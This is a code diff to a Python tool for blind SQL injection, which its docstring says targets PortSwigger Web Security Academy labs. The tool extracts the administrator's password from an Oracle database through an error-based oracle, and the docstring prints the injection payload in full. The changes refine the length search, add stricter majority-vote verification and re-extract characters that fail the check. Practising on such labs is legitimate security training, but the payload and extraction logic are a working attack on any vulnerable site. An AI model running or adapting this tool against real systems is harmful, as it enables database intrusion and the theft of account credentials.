@@ -3,7 +3,7 @@
 Oracle error-based blind SQL injection password extractor
 (PortSwigger Web Security Academy labs).
 
-Default payload (concat style — cookie/string-context injection):
+Default payload (concat style, cookie/string-context injection):
   xyz'||(SELECT CASE WHEN (COND) THEN TO_CHAR(1/0) ELSE '' END
         FROM users WHERE username='administrator')||'
 
@@ -159,28 +159,26 @@ class OracleErrorBrute:
         for _ in range(3):
             if self.healthy():
                 return True
-            print("[!] Canary check failed (server noisy/throttling) — waiting 3s ...")
+            print("[!] Canary check failed (server noisy/throttling) - waiting 3s ...")
             time.sleep(3)
         return False
 
     def length(self) -> int:
         col = self.args.column
-        lo = 0
         for _ in range(self.args.retries):
+            # smallest n for which LENGTH > n is false -> n is the length
             lo, hi = 0, self.args.max_length
             while lo < hi:
-                mid = (lo + hi + 1) // 2
+                mid = (lo + hi) // 2
                 if self.ask(f"LENGTH({col}) > {mid}"):
-                    lo = mid
+                    lo = mid + 1
                 else:
-                    hi = mid - 1
+                    hi = mid
             if lo == 0:
                 return 0
-            if self.ask_majority(f"LENGTH({col}) = {lo}") and not self.ask_majority(
-                f"LENGTH({col}) = {lo + 1}"
-            ):
+            if self.ask_majority(f"LENGTH({col}) = {lo}"):
                 return lo
-            print("[!] Length verification inconsistent — redoing search ...")
+            print("[!] Length verification inconsistent - redoing search ...")
         return lo
 
     def bit_condition(self, pos: int, bit: int) -> str:
@@ -230,7 +228,7 @@ class OracleErrorBrute:
     def fix_positions(self, codes: dict) -> None:
         bad = self.verify_positions(codes)
         for pos in sorted(bad):
-            print(f"[!] Position {pos}: parallel result unverified — re-extracting ...")
+            print(f"[!] Position {pos}: parallel result unverified - re-extracting ...")
             ch = self.char_at_sequential(pos)
             if ch != "?":
                 codes[pos] = ord(ch)
@@ -241,7 +239,10 @@ class OracleErrorBrute:
         return codes
 
     def verify_full(self, extracted: str) -> bool:
-        return self.ask_majority(f"{self.args.column} = '{extracted}'")
+        # strict 4-of-5: a plain majority can false-pass on a noisy oracle
+        cond = f"{self.args.column} = '{extracted}'"
+        results = list(self.pool.map(lambda _: self.ask(cond), range(5)))
+        return sum(results) >= 4
 
 
 def self_test(brute: OracleErrorBrute) -> bool:
@@ -290,23 +291,34 @@ def main():
             f"LENGTH({args.column}) > {count}", 3
         ):
             count += 1
-            print(f"[!] Password longer than expected — adding position {count}")
+            print(f"[!] Password longer than expected - adding position {count}")
             new = brute.extract_parallel([count])
             brute.fix_positions(new)
             codes.update(new)
             extracted = "".join(chr(codes[p]) for p in sorted(codes))
             print(f"[*] Progress: {extracted}")
 
-        print(f"[*] Final verification: {args.column} = '<extracted>' (3 votes) ...")
-        if brute.verify_full(extracted):
-            print("[+] Verified: string matches the stored value exactly")
-        else:
-            print("[!] Full-string verification FAILED — re-checking positions ...")
+        print(f"[*] Final verification: {args.column} = '<extracted>' (5 votes) ...")
+        verified = False
+        for _ in range(3):
+            if brute.verify_full(extracted):
+                verified = True
+                break
+            print("[!] Full-string verification FAILED - re-checking positions ...")
+            fixed_any = False
             for pos in sorted(codes):
-                if not brute.ask(brute.char_condition(pos, "=", codes[pos])):
+                if not brute.ask_majority(brute.char_condition(pos, "=", codes[pos])):
                     print(f"[!]   position {pos}: {chr(codes[pos])!r} is wrong")
-            if brute.ask(f"LENGTH({args.column}) > {len(extracted)}"):
+                    ch = brute.char_at_sequential(pos)
+                    if ch != "?":
+                        codes[pos] = ord(ch)
+                        fixed_any = True
+            if brute.ask_majority(f"LENGTH({args.column}) > {len(extracted)}"):
                 print(f"[!]   password is longer than {len(extracted)} chars!")
+            if not fixed_any:
+                break
+            extracted = "".join(chr(codes[p]) for p in sorted(codes))
+            print(f"[*] Progress: {extracted}")
     except KeyboardInterrupt:
         print("\n[!] Interrupted by user")
         sys.exit(130)
@@ -314,8 +326,14 @@ def main():
         brute.pool.shutdown(wait=False)
 
     elapsed = time.time() - start
-    print(f"\n[+] Password (repr): {extracted!r} ({len(extracted)} chars)")
+    if verified:
+        print(f"\n[+] Verified: string matches the stored value exactly")
+    else:
+        print(f"\n[!] UNVERIFIED: result may be wrong - do not rely on it")
+    print(f"[+] Password (repr): {extracted!r} ({len(extracted)} chars)")
     print(f"[+] Requests: {brute.requests_sent} in {elapsed:.1f}s")
+    if not verified:
+        sys.exit(1)
 
 
 if __name__ == "__main__":
